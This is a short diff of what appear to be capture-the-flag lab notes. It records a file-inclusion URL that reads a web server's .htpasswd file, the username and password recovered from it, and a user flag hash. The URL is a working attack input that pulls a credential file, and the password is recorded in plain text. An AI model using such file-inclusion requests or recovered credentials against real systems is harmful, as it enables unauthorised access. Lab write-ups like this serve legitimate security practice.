@@ -1,0 +1,5 @@
+
+http://10.129.83.109/?file=.htpasswd   -> mike:Sheffield19 
+
+
+user flag = a56ef91d70cfbf2cdb8f454c006935a1
